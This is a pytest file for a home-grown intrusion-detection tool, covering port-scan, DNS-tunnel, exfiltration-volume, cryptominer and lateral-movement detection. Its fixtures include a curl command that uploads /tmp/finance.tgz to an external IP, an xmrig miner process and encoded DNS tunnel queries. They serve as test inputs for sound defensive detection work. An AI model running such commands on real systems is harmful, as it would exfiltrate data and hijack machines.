from collections import namedtuple

import baseline
import procwatch
import traffic_analyzer as ta
from soarclient import Suppressor

Addr = namedtuple("Addr", "ip port")
Conn = namedtuple("Conn", "raddr status pid")


class FakeClient:
    host = "ws01"

    def __init__(self):
        self.findings = []

    def finding(self, type_, severity, summary, **fields):
        self.findings.append((type_, severity))

    def flush(self):
        pass


class FakeProc:
    def __init__(self, pid, name, cmd, cpu=0):
        self.info = {"pid": pid, "name": name, "cmdline": cmd.split(), "cpu_percent": cpu}


def test_browsing_many_sites_is_not_a_scan():
    rules = ta.PacketRules()
    out = [f for i in range(40) for f in rules.syn(1.0, "10.10.10.11", f"52.29.{i}.1", 443)]
    assert out == []


def test_own_traffic_is_ignored():
    rules = ta.PacketRules(ignore={"10.10.0.10"})
    assert [f for p in range(1, 60) for f in rules.syn(1.0, "10.10.0.10", "10.30.10.5", p)] == []


def test_internal_sweep_on_one_port():
    rules = ta.PacketRules()
    out = [f for i in range(1, 20) for f in rules.syn(1.0, "10.10.10.11", f"10.10.20.{i}", 22)]
    assert out and out[-1][0] == "network.portscan"


def test_portscan_detected_after_15_ports():
    rules = ta.PacketRules()
    out = []
    for port in range(20, 45):
        out += rules.syn(100.0, "10.10.10.11", "10.10.20.10", port)
    assert ("network.portscan", 7) in [(f[0], f[1]) for f in out]


def test_normal_connections_are_not_a_scan():
    rules = ta.PacketRules()
    out = [f for p in (80, 443, 443, 53) for f in rules.syn(1.0, "10.10.10.11", "93.184.216.34", p)]
    assert out == []


def test_mining_port_is_unusual():
    out = ta.PacketRules().syn(1.0, "10.10.10.12", "18.192.4.4", 3333)
    assert out[0][0] == "network.unusual_protocol" and out[0][1] == 6


def test_dns_tunnel_needs_volume_of_long_random_names():
    rules = ta.PacketRules()
    label = "mfrggzdfmztwq2lknnwg23tpobyxe43uov3ho6dzpi"
    out = []
    for i in range(12):
        out += rules.dns_query(i, "10.10.20.10", f"{label}{i}.files.exfil-lab.net")
    assert out and out[-1][0] == "network.dns_tunnel"
    assert ta.PacketRules().dns_query(1, "10.10.20.10", "www.wikipedia.org") == []


def test_volume_rule_learns_then_flags():
    rule = ta.VolumeRule(floor=1_000_000)
    rule.update({"10.10.20.10": 0})
    for total in (100_000, 200_000, 300_000):          # ~100 kB/min is normal
        assert rule.update({"10.10.20.10": total}) == []
    out = rule.update({"10.10.20.10": 60_300_000})      # 60 MB in a minute
    assert out[0][0] == "network.exfil_volume"


def test_procwatch_miner_and_exfil():
    client = FakeClient()
    watch = procwatch.ProcWatch(client, "10.10.10.12")
    watch.check_process(FakeProc(10, "xmrig", "/tmp/xmrig"), [Conn(Addr("18.1.1.1", 3333), "ESTABLISHED", 10)], 0)
    watch.check_process(FakeProc(11, "curl", "curl -s -T /tmp/finance.tgz http://18.1.1.1:8080/upload"),
                        [Conn(Addr("18.1.1.1", 8080), "ESTABLISHED", 11)], 0)
    assert ("process.cryptominer", 9) in client.findings
    assert ("process.exfiltration", 8) in client.findings


def test_procwatch_lateral_movement():
    client = FakeClient()
    watch = procwatch.ProcWatch(client, "10.10.10.11")
    conns = [Conn(Addr(ip, 22), "ESTABLISHED", 5) for ip in ("10.10.20.10", "10.10.10.12", "10.10.0.10")]
    watch.check_process(FakeProc(5, "bash", "bash"), conns, 0)
    watch.check_spread(1)
    assert ("process.lateral_movement", 8) in client.findings


def test_procwatch_ignores_allowed_busy_process():
    client = FakeClient()
    watch = procwatch.ProcWatch(client, "10.10.10.11")
    for _ in range(5):
        watch.check_process(FakeProc(7, "apt-get", "apt-get upgrade", cpu=99), [], 0)
    assert client.findings == []


def test_suppressor():
    s = Suppressor(300)
    assert s.first("x", now=0) and not s.first("x", now=100) and s.first("x", now=301)


def test_baseline_summary():
    pkts = [{"t": i * 10, "src": "10.10.10.11", "dst": "93.184.216.34", "proto": "TCP", "dport": 443,
             "length": 1000, "dns": None} for i in range(30)]
    pkts.append({"t": 5, "src": "10.10.10.11", "dst": "10.10.0.10", "proto": "UDP", "dport": 53,
                 "length": 80, "dns": "www.example.com"})
    b = baseline.summarise(pkts)
    assert b["protocols"]["TCP"] == 30 and b["top_ports"][443] == 30
    assert b["bytes_per_min"]["10.10.10.11"] > 0 and b["dns_label_p99"] == 3


def test_soarclient_rebuilds_its_aws_client_after_a_failure(tmp_path, monkeypatch):
    # On an SSM hybrid node the agent rotates the credentials file every hour; a client kept
    # after a failure holds expired credentials forever (found on vSphere, 5 November).
    import sys
    import types
    from soarclient import SoarClient

    class Expired:
        def get_parameter(self, **_):
            raise RuntimeError("ExpiredTokenException")

    class Fresh:
        def get_parameter(self, Name, WithDecryption=False):
            return {"Parameter": {"Value": Name.rsplit("/", 1)[1]}}

    clients = iter([Expired(), Fresh()])
    monkeypatch.setitem(sys.modules, "boto3", types.SimpleNamespace(client=lambda *a, **k: next(clients)))
    c = SoarClient("procwatch", "eu-central-1", log_file=tmp_path / "d.log")
    assert c.settings is None
    assert c._load_settings()
    assert c.settings["url"] == "webhook-url"
